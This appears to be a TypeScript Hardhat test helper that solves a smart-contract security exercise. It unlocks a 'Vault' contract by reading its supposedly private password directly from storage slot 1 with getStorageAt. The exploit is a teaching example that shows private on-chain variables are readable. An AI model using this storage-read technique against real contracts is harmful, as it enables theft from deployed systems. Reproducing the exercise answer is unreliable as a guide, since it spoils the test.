import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const paddedSlot: string = ethers.utils.hexlify(1);
  const password: string = await ethers.provider.getStorageAt(
    victim.address,
    paddedSlot
  );
  await victim.unlock(password);
};

export default helper;
